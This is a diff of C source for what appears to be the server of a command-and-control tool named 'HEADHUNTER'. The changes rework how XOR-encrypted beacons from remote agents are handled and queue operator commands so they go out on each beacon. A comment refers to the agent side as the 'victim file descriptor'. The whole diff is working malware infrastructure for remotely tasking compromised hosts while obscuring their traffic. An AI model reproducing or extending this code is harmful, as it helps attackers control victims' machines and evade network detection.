@@ -11,21 +11,24 @@
 extern char* key;
 extern int keylen;
 
+
 void* BeaconRecv(void* arg){
 
         int fd = *((int *) arg);
-        char beacon[1000];
+        char beacon[MAXBUF];
         int n;
+        char* response = "--HEADHUNTER NO--";
+        char* xorresponse = XOR(response, key, strlen(response), keylen);
 
-        while(((n = recv(fd, beacon, 1000, 0)) > 0)){
-                char* xorbeacon = XOR(beacon, key, 1000, keylen);
-//              printf("xorbeacon is: %s\n", xorbeacon);
+        while(((n = recv(fd, beacon, MAXBUF, 0)) > 0)){
+                char* xorbeacon = XOR(beacon, key, n, keylen);
                 if(str_starts_with(xorbeacon, "--HEADHUNTER BEACON--") == 0){
                         for(int i = 0; i < max_clients; i++){
                                 if(client_socket[i] == fd){
                                         gettimeofday(&last_check[i], NULL);
                                 }
                         }
+                        send(fd, xorresponse, strlen(response), 0);
                 }
                 free(xorbeacon);
         }
@@ -141,6 +144,8 @@ void *Socket_Reader(){
     char buffer[MAXBUF];
     int n;
     char* xorbuffer;
+    char* response = "--HEADHUNTER NO--";
+    char* xorresponse = XOR(response, key, strlen(response), keylen);
 
     printf("beacon> ");
 
@@ -157,12 +162,25 @@ void *Socket_Reader(){
 
 	}
 	else if(str_starts_with(xorbuffer, "--HEADHUNTER BEACON--") == 0){
+        
 		for(int i = 0; i < max_clients; i++){
 	    	    if(client_socket[i] == a.dest){
 		    	client_status[i] = 1;
-			gettimeofday(&last_check[i], NULL);
+			    gettimeofday(&last_check[i], NULL);
 		    }
+        	}
+
+        
+        	if(a.beaconbufsize > 0){
+            		
+			char* xorcommand = XOR(a.beaconbuf, key, a.beaconbufsize, keylen);
+            		send(a.dest, xorcommand, a.beaconbufsize, 0);       
+			a.beaconbufsize = 0;
 		}
+		else{
+			send(a.dest, xorresponse, strlen(response), 0);
+		}
+
 		free(xorbuffer);
 		continue;
 	}
@@ -199,7 +217,6 @@ void *Socket_Writer()
 
     while (a.kill == 0 && (n = read(a.src, buffer, MAXBUF)) > 0)
     {
-
         if (strcmp(newline_terminator(buffer), "bg\n") == 0) {
 	    
             printf("Backgrounding session...\n");
@@ -228,8 +245,10 @@ void *Socket_Writer()
 	else if(strcmp(newline_terminator(buffer), "exit\n") == 0){
 	
 	    printf("\e[1;32m[+]\e[0m Tasking agent with exit\n");	
-	    char* xorbuffer = XOR(buffer, key, n, keylen);
-	    write(a.dest, xorbuffer, n);
+
+	    char* exit = "--HEADHUNTER EXIT--";
+	    char* xorexit = XOR(exit, key, strlen(exit), keylen);
+	    send(a.dest, xorexit, strlen(exit), 0);
 
 	    for(int i = 0; i < max_clients; i++){
 	    	if(client_socket[i] == a.dest){
@@ -247,7 +266,6 @@ void *Socket_Writer()
 		}
 	    }
 
-	    free(xorbuffer);
 	    return NULL;
 	}
 
@@ -255,17 +273,15 @@ void *Socket_Writer()
 	
 	    
 	    printf("\n\e[1;32m[+]\e[0m Tasking agent with command\n");
-	    
-
-	    char* xorbuffer = XOR(buffer, key, n, keylen);
-
-            write(a.dest, xorbuffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 12
-	    free(xorbuffer);
+	    a.beaconbufsize = n;
+	    a.beaconbuf = buffer;
+          
+	    //free(xorbuffer);
         }
     }
 
     if (n < 0)
-        printf("Error in function thread read()\n");
+        printf("n is: %i Error in function thread read()\n", n);
 
     a.kill = 1;
     return NULL;
@@ -326,6 +342,8 @@ void *Acceptor(){
                     if( client_socket[i] == 0 ){
 			
 			char beacon[MAXBUF];
+            char* response = "--HEADHUNTER NO--";
+            char* xorresponse = XOR(response, key, strlen(response), keylen);
 			int n = recv(new_socket, beacon, MAXBUF, 0);
 			char* xorbeacon = XOR(beacon, key, n, keylen);
 			if(str_starts_with(xorbeacon, "--HEADHUNTER BEACON--") == 0){
@@ -339,6 +357,7 @@ void *Acceptor(){
 
 				client_status[i] = 1;
 				gettimeofday(&last_check[i], NULL);
+                send(client_socket[i], xorresponse, strlen(response), 0);
 				*arg = client_socket[i];
 
                         	printf("\nBeacon received from %s\n", get_socket_addr(new_socket));
